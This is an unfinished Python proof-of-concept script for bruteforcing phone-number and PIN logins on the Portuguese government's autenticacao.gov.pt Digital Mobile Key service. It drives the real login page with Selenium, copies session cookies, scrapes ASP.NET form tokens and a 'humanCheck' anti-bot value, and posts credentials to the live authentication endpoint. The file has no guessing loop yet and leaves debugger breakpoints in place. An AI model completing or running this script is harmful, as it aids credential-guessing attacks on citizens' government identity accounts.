"""
A simple Proof Of Concept script that bruteforces the logins
on the https://autenticacao.gov.pt Chave Móvel Digial (Digital Mobile Key)
login.
"""

from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import requests
from bs4 import BeautifulSoup

def go_to_login_page(driver):
    driver.get('https://frtend.reg.cmd.autenticacao.gov.pt/Ama.Registry.Frontend/Processes/RegistryOnline/LoginOnline.aspx')

    dmk_tab = driver.find_element_by_id('ctl00_MainContent_tabCMD')
    dmk_tab.click()

    dmk_auth_btn = driver.find_element_by_id('ctl00_MainContent_Button2')
    dmk_auth_btn.click()

def get_requests_session_obj_from_driver(driver):
    session = requests.Session()
    for cookie in driver.get_cookies():
        session.cookies.set(cookie['name'], cookie['value'])
    return session

def attempt_login(driver, phone, pin):
    POST_URL = 'https://cmd.autenticacao.gov.pt/Ama.Authentication.Frontend/Processes/Authentication/MobileAuthentication.aspx'

    session = get_requests_session_obj_from_driver(driver)
    data = parse_form_data_from_HTML(driver.page_source, '+351 961111111', '1234')
    
    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.9',
        'Cache-Control': 'max-age=0',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Host':'cmd.autenticacao.gov.pt',
        'Origin':'https://cmd.autenticacao.gov.pt',
        'Referer':'https://cmd.autenticacao.gov.pt/Ama.Authentication.Frontend/Processes/Authentication/MobileAuthentication.aspx',
        'Upgrade-Insecure-Requests':'1',
        'User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36'

    }
    res = session.post(POST_URL, data=data, headers=headers)
    import pdb; pdb.set_trace()


def attempt_login_webdriver(driver, phone, pin):
    hidden_mobile_number_elem = driver.find_element_by_id('MainContent_hiddenMobile')
    pin_field = driver.find_element_by_id('MainContent_txtPin')

def get_attr_value_from_elem_id(bs, elem_id, attr_name):
    elem = bs.find(id=elem_id)
    elem_value = elem.get(attr_name)
    return elem_value

def parse_form_data_from_HTML(html, phone, pin):
    bs = BeautifulSoup(html)

    human_check = get_attr_value_from_elem_id(bs, 'humanCheck', 'value')
    event_target = get_attr_value_from_elem_id(bs, '__EVENTTARGET', 'value')
    event_argument = get_attr_value_from_elem_id(bs, '__EVENTARGUMENT', 'value')
    view_state = get_attr_value_from_elem_id(bs, '__VIEWSTATE', 'value')
    event_validation = get_attr_value_from_elem_id(bs, '__EVENTVALIDATION', 'value')

    data = {
        '__EVENTTARGET': event_target,
        '__EVENTARGUMENT': event_argument,
        '__VIEWSTATE': view_state,
        '__EVENTVALIDATION': event_validation,
        'ctl00$MainContent$hiddenMobile': phone,
        'humanCheck': human_check,
        'inputMobile': phone,
        'ctl00$MainContent$txtPin': pin,
        'ctl00$MainContent$btnNext': 'Autenticar',
    }

    return data

driver = webdriver.Chrome()
driver.implicitly_wait(10)

go_to_login_page(driver)

attempt_login(driver, '+351 961111111', '1234')

import pdb; pdb.set_trace()
driver.close()
